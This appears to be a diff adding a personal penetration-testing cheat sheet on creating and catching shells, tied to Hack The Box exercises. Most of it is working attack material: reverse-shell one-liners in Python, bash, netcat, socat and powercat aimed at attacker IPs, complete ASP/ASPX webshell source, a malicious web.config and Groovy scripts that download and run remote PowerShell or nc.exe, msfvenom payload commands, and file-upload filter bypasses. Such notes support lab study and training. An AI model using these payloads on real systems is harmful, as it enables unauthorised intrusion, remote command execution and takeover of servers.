@@ -1,0 +1,452 @@
+Shells:
+======
+Basics:
+	Read Malware Basics Sheet.
+Creating Shells:
+	Note:
+		Important Resource:
+			http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+		Most of his shells are one liner, so, if we want to put a shell file, we need to make changes.
+	Bind Shell:
+		Linux Payloads:
+			Read Linux Privesc Sheet
+		Windows Payloads:
+			Read Windows Privesc Sheet
+	Reverse Shell:		
+		Linux Shells:
+			Read Linux Privesc Sheet
+		Windows Shells:
+			Read Windows Privesc Sheet
+		Python Shell:
+			One-Liner:
+				Manual:(2)
+					1. python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
+					2.  python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.10.10”,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“/bin/sh”)’
+			.py File:
+				Windows:
+				Linux:
+					Automated:
+						msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4545 -f raw > shell.py
+		WebShells:
+			WebShells in kali:
+				/usr/share/webshells
+				/usr/share/seclists/webshells/
+			PHP Shells:
+				Read PHP Vulnerabilities sheet
+			IIS Shells:
+				ASPX Shells:
+					1. /usr/share/webshells/aspx/cmdasp.aspx
+						it will make a dialouge box on webpage, to execute commands
+						used in HTB::silo
+					2. msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=192.168.119.201 LPORT=4444 -o reverse-shell.aspx
+						used in HTB::Granny, HTB::devel
+					3. https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
+						Its a great shell, by far the best
+					4. Custom-Shell 1:
+						<%-- ASPX Shell by LT <lt@mac.hush.com> (2007) --%>
+						<%@ Page Language="C#" EnableViewState="false" %>
+						<%@ Import Namespace="System.Web.UI.WebControls" %>
+						<%@ Import Namespace="System.Diagnostics" %>
+						<%@ Import Namespace="System.IO" %>
+						<%
+						Set rs = CreateObject("WScript.shell")
+						Set cmd = rs.Exec("cmd /c command_to_run")
+						o = cmd.StdOut.Readall()
+						Response.write(o)
+						%>
+					5. Custom-Shell 2:
+						<%@ Page Language="C#" Debug="true" Trace="false" %>
+						<%@ Import Namespace="System.Diagnostics" %>
+						<%@ Import Namespace="System.IO" %>
+						<script Language="c#" runat="server">
+						void Page_Load(object sender, EventArgs e)
+						{
+						}
+						string ExcuteCmd(string arg)
+						{
+						ProcessStartInfo psi = new ProcessStartInfo();
+						psi.FileName = "cmd.exe";
+						psi.Arguments = "/c "+arg;
+						psi.RedirectStandardOutput = true;
+						psi.UseShellExecute = false;
+						Process p = Process.Start(psi);
+						StreamReader stmrdr = p.StandardOutput;
+						string s = stmrdr.ReadToEnd();
+						stmrdr.Close();
+						return s;
+						}
+						void cmdExe_Click(object sender, System.EventArgs e)
+						{
+						Response.Write("<pre>");
+						Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
+						Response.Write("</pre>");
+						}
+						</script>
+						<HTML>
+						<HEAD>
+						<title>awen asp.net webshell</title>
+						</HEAD>
+						<body >
+						<form id="cmd" method="post" runat="server">
+						<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
+						<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
+						<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
+						</form>
+						</body>
+						</HTML>
+				ASP shells:
+					1. /usr/share/webshells/asp/cmdasp.asp
+					2. msfvenom -p windows/shell_reverse_tcp -f asp LHOST=192.168.119.201 LPORT=4444 -o reverse-shell.asp 
+					3. github.com/tennc/webshell/blob/master/asp/webshell.asp
+					4. github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
+					5. Custom-Shell 1:
+						<%
+						Dim oS
+						On Error Resume Next
+						Set oS = Server.CreateObject("WSCRIPT.SHELL")
+						Call oS.Run("win.com cmd.exe /c c:\Inetpub\shell443.exe",0,True)
+						%>
+						Note:
+							It requires to upload an executable shell too
+					6. Custom-Shell 2:
+						<%
+						Dim oS,oSNet,oFSys, oF,szCMD, szTF
+						On Error Resume Next
+						Set oS = Server.CreateObject("WSCRIPT.SHELL")
+						Set oSNet = Server.CreateObject("WSCRIPT.NETWORK")
+						Set oFSys = Server.CreateObject("Scripting.FileSystemObject")
+						szCMD = Request.Form("C")
+						If (szCMD <> "") Then
+						  szTF = "c:\windows\pchealth\ERRORREP\QHEADLES\" &  oFSys.GetTempName()
+						  Call oS.Run("win.com cmd.exe /c """ & szCMD & " > " & szTF &
+						"""",0,True)
+						  response.write szTF
+						  ' Change perms
+						  Call oS.Run("win.com cmd.exe /c cacls.exe " & szTF & " /E /G
+						everyone:F",0,True)
+						  Set oF = oFSys.OpenTextFile(szTF,1,False,0)
+						End If 
+						%>
+						<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
+						<input type=text name="C" size=70 value="<%= szCMD %>">
+						<input type=submit value="Run"></FORM><PRE>
+						Machine: <%=oSNet.ComputerName%><BR>
+						Username: <%=oSNet.UserName%><br>
+						<% 
+						If (IsObject(oF)) Then
+						  On Error Resume Next
+						  Response.Write Server.HTMLEncode(oF.ReadAll)
+						  oF.Close
+						  Call oS.Run("win.com cmd.exe /c del "& szTF,0,True)
+						End If 
+						%>
+					7. Custom-Shell 3:
+						<%@ Language=VBScript %>
+						<%
+
+						  Dim oScript
+						  Dim oScriptNet
+						  Dim oFileSys, oFile
+						  Dim szCMD, szTempFile
+
+						  On Error Resume Next
+
+						  ' -- create the COM objects that we will be using -- '
+						  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+						  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+						  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+
+						  ' -- check for a command that we have posted -- '
+						  szCMD = Request.Form(".CMD")
+						  If (szCMD <> "") Then
+
+						    ' -- Use a poor man's pipe ... a temp file -- '
+						    szTempFile = "C:\" & oFileSys.GetTempName( )
+						    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
+						    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
+
+						  End If
+
+						%>
+						<HTML>
+						<BODY>
+						<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
+						<input type=text name=".CMD" size=45 value="<%= szCMD %>">
+						<input type=submit value="Run">
+						</FORM>
+						<PRE>
+						<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
+						<br>
+						<%
+						  If (IsObject(oFile)) Then
+						    ' -- Read the output from our command and remove the temp file -- '
+						    On Error Resume Next
+						    Response.Write Server.HTMLEncode(oFile.ReadAll)
+						    oFile.Close
+						    Call oFileSys.DeleteFile(szTempFile, True)
+						  End If
+						%>
+						</BODY>
+						</HTML>
+				web.config shell:
+					web.config to get a ps shell:(used with invoke-tcp.ps1)
+						<?xml version="1.0" encoding="UTF-8"?>
+						<configuration>
+						    <system.webServer>
+						      <handlers accessPolicy="Read, Script, Write">
+						         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+						      </handlers>
+						      <security>
+						         <requestFiltering>
+						            <fileExtensions>
+						               <remove fileExtension=".config" />
+						            </fileExtensions>
+						            <hiddenSegments>
+						               <remove segment="web.config" />
+						            </hiddenSegments>
+						         </requestFiltering>
+						      </security>
+						   </system.webServer>
+						</configuration>
+						<%@ Language=VBScript %>
+						<%
+						  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')")
+						%>			
+					Note:
+						Used in HTB::Bounty
+				Upload bypass for asp/aspx:
+					nullbyte:(%00)
+						upload aspx and intercept request
+							file="shell.aspx"
+						change it to
+							file="shell.aspx%00.jpg"
+						used in HTB::Bounty
+				NOTE:
+					iis server can have all these shells => aspx/asp/web.config/php
+					iis server can have php files allowed!
+			Groovy Script:
+				Used in Jenkins CMS
+				used in HTB::Jeeves
+				shell-1:
+					def cmd = "powershell -ep bypass iex(New-Object Net.WebClient).DownloadString('http://10.10.14.7/shell.ps1')".execute();
+					println("${cmd.text}");
+				shell-2:
+					def cmd = "cmd.exe /c //10.10.14.7/abcd/nc.exe -e 10.10.14.7 443".execute();
+					println("${cmd.text}");
+			war shell:
+				msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
+			Coldfusion:
+				jsp shells:
+					Uploaded in coldfusion (htb::artic)
+					1. msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.47 LPORT=443 -f raw > shell.jsp
+					2. /usr/share/webshells/cmdjsp.jsp
+					3. /usr/share/webshells/jsp-reverse.jsp
+					Upload bypass for jsp:
+						Change the extension:
+							.jsp
+							.jspx
+							.jsw
+							.jsv
+							.jspf
+							Note:
+								Use Burp Intruder for this
+				cfm shells:
+					Upload bypass for cfm:
+						Change the extension:
+							.cfm
+							.cfml
+							.cfc
+							.dbm
+			Bypassing the Upload checks:
+				for any file type:(universal)
+					There are checks in the upload section, they might use the MIME type information present in the HTTP header parameters to check what kind of a file is it.
+						MIME Type: image/jpeg, image/png, text/html
+					Another method which might fail most of the time is to just change the filename. If a png format file is allowed but not a php file, then just change the name from file.png to file.php. It might hinder the attack so you will have to keep all that in mind.
+						php phtml, .php, .php3, .php4, .php5, and .inc
+						asp asp, .aspx, .config
+						perl .pl, .pm, .cgi, .lib
+						jsp .jsp, .jspx, .jsw, .jsv, and .jspf
+						Coldfusion .cfm, .cfml, .cfc, .dbm			
+			Netcat:
+				1. direct use nc.exe => read in exploitation sheet
+				2. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f
+				3. rm -f /tmp/p; mknod /tmp/p p && nc 10.10.10.10 9999 0/tmp/p
+				Making .sh file of above payload:
+					#!bin/bash/
+					rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f
+			Bash Reverse Shell:
+				bash -i >& /dev/tcp/10.10.10.10/9999 0>&1
+				0<&196;exec 196<>/dev/tcp/10.10.10.10/9999; sh <&196 >&196 2>&196
+				exec 5<> /dev/tcp/10.10.10.10/9999; cat <&5 | while read line; do $line 2>&5>&5; done
+Creating Shell User-Friendly:
+	RLWrap:(apt-get install rlwrap)
+		Basics:
+			This tool allows us to use command history and arrow buttons.
+		Usage:
+			rlwrap -r nc -nlvp 443
+			rlwrap -r <command>
+			Flags:
+				-r => 
+Moving netcat shell to msfconsole:
+	manual method:
+		make a payload
+		upload payload to victim
+		start listener on msfconsole
+		execute payload in victim
+	automated method:(msf)
+		use exploit/multi/script/web_delivery
+		set target accordingly
+			for windows => PSH (powershell)
+		set payload windows/meterpreter/reverse_tcp
+		set lhost tun0
+		set srvhost tun0
+		run
+		it will give a cmd oneliner, run it in netcat shell
+Getting Shell Over Internet:
+	Case-1: Target or the initial point of entry is behind a NAT or firewalled
+		Lets say we hack internet facing webapp, got shell and now we want to own other devices. But since NAT is enabled, all the other devices share same public IP with victim-1.
+		This is not at all an unusual scenario and can be dealt with from within Metasploit
+		Metasploit:
+			Method-1:reverse shell
+				Used for:
+					NAT
+				Advantages:
+					1. Firewall wont block incoming on ports like 53/80/443/etc
+					2. We can encrypt traffic via https(443)
+					3. Resilience:
+						Ability of payload of keep the connection up and re-establish it if necessary
+				That means our payload will initiate a connection to our handler
+	Case-2: Attacker machine is behind NAT or firewall too:
+		We cannot use Reverse shell in this case as connections from victim wont be able to reach the handler as its behind the NAT
+		Method-1:
+			Create a Reverse SSH tunnel between attacker machine and a machine(Tunnel-Machine) that is "publicly accesible on internet"(VPS). Due to this, the connection from victim will reach the handler on Tunnel-Machine which will be tunneled back to the attacker machine.
+			Steps:
+				Step-1: Start handler on localhost(127.0.0.1) on port xyz
+				Step-2: Create Reverse SSH tunnel between Attacker machine and VPS(Tunnel-Machine) over port xyz
+				Step-2: Execute Reverse shell on victim
+Tools:
+	Creating Shell:
+		MSFVenom:
+			Read Metasploit Sheet.
+	For Listening:
+		Netcat:
+			Basics:
+				It supports both TCP & UDP
+				Modes:
+					A. Client mode:
+					 	to connect to ip:port
+					B. Server mode:
+						to listen on a port
+			Usage:
+				Connecting to a port/banner grabbing:(client Mode)
+					nc -nv ip port 
+				Listening on a port:(server mode)
+					nc -nvlp port
+				File transfer:
+					It can happen in both text and binary mode
+					Reciever:(server mode)
+						nc -nvlp port > incoming.exe
+					Sender:(client mode)
+						nc -nv reciever_ip port < wget.exe
+				Remote Administration:
+					Bind Shell:
+						Attacker:(client)
+							nc victim_ip 4444
+							here, we are connecting to victim, ie, we initiates the connection
+						Victim:(server)
+							nc -nvlp 4444 -e cmd.exe
+							victim listens
+					Reverse Shell:
+						Attacker:(server)
+							nc -nvlp 4444
+							here, we are listening
+						Victim:(client)
+							nc -nv attacker_ip port -e cmd.exe
+							here, victim connects to us, ie, victim initiates the connection
+				Flags:
+					-n => skip DNS name resolution
+					-v => verbose
+					-l => listen
+					-p => port no
+					-e => execute
+						cmd.exe => for windows
+						powershell.exe => powershell
+						/bin/bash => for linux
+			Note:
+				Sometimes, '-e' flag is not supported by nc binary available in victim environment, then:
+					rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+		Socat:
+			Basics:
+				Why to use?
+					1. some boxes may have socat instead of netcat
+					2. SSL-Encrypted bind shells
+			Usage:
+				Connecting to a port:(banner grabbing)
+					socat - TCP4:ip:port 
+				Setting up a listener:
+					socat TCP4-LISTEN:port STDOUT
+				Transfering files:
+					Sender:(listener)
+						socat TCP4-LISTEN:port,fork file:filename.exe
+					Reciever:
+						socat TCP4:sender_ip:port file:filename.exe,create
+				Remote Administration:
+					Bind Shell:(ENCRYPTED)
+						Encryption:
+							for this, we use ssl cert:
+								openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out cert.crt
+									req => iniate a new cert signing request
+									-newkey => generate a new private key
+									rsa:2048 => use RSA 2048 bit encryption
+									-nodes => store private key without passphrase protection
+									-keyout => save key to a file
+									-x509 => output a self signed certificate
+									-days => vailidity in days
+								we will get two files: 
+									cert.key 
+									cert.crt
+								cat cert.key cert.crt > cert.pem
+						Attacker:(client)
+							socat - OPENSSL:attacker_ip:443,verify=0
+						Victim:(server)
+							socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork EXEC:/bin/bash
+							verify=0 => disable ssl cert verification
+					Reverse Shell:
+						Attacker:(server)
+							socat -d -d TCP4-LISTEN:port STDOUT
+							here, we are listening
+						Victim:(client)
+							socat TCP4:victim_ip:port EXEC:/bin/bash 
+							here, victim connects to us, ie, victim initiates the connection	
+				Flags:
+					- => to transfer data b/w STDIO(Standard input-output) and remote host
+					OPENSSL-LISTEN => to create the listener on port 443
+					verify=0 => to disable SSL verification
+					fork => creates a child process once a Connection is made to listener+
+					-d => verbose
+					create => specifies that a new file will be created
+					STDOUT => to connect standard output (STDOUT) to the TCP socket
+					EXEC: => same as -e of netcat
+				Note:
+					We can also use socat to upgrade the shell:
+						socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr
+		Powercat:(apt-get install powercat)
+			Basics:
+			Usage:
+				File transfer:
+					Kali:
+						nc -nvlp 443 > a.ps1 => reciever
+					Windows:
+						powercat -c attacker_ip -p 443 -i C:\Users\Offsec\powercat.ps1 => sender
+				Bind shell:
+					Attacker:(client)
+						nc victim_ip 443
+					Windows:(server)
+						powercat -l -p 443 -e cmd.exe
+				Reverse shell:
+					Attacker:(server)
+						nc -nvlp 443
+					windows:(client)
+						powercat -c 10.11.0.4 -p 443 -e cmd.exe
+		Note:
+			we need sudo permissions to listen at a port below 1024
